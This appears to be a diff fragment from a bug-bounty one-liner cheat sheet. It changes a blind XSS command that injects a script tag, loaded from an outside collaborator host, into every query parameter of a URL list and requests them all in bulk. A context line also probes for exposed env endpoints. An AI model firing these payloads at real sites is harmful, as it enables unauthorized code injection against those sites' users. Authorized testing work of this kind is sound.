@@ -88,7 +88,7 @@ cat live-domains | rush -j40 'if curl -skI -m 10 "{}/env" | grep -i "x-applicati
 
 ## Blind XSS:
 
-cat urls.txt | qsreplace '"><script src="https://script.xss.ht"></script>' | rush -j40 'curl -sk "{}" -o /dev/null'
+cat urls.txt | qsreplace '"><script src="https://js.rip/2bt7kuh0pi"></script>' | rush -j40 'curl -sk "{}" -o /dev/null'
 
 
 ## Reflection Check (XSS) on one domain by extracting Hidden params
